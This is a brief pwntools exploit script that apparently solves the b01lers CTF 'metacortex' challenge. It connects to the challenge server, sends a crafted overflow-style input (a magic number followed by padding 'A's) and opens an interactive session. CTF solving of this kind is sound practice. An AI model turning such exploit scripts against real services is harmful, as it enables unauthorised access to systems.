#!/usr/bin/python3
from pwn import *
from past.builtins import xrange
from time import sleep
import random

if __name__ =='__main__':
#	io = process('./metacortex-72ec7dee20d0b191fe14dc2480bd3f43')
	io = remote('chal.ctf.b01lers.com',1014)
#	pause()
	io.sendlineafter('Work for the respectable software company, Neo.\n',str(0x41414141)+'A'*0x5a)
	io.interactive()
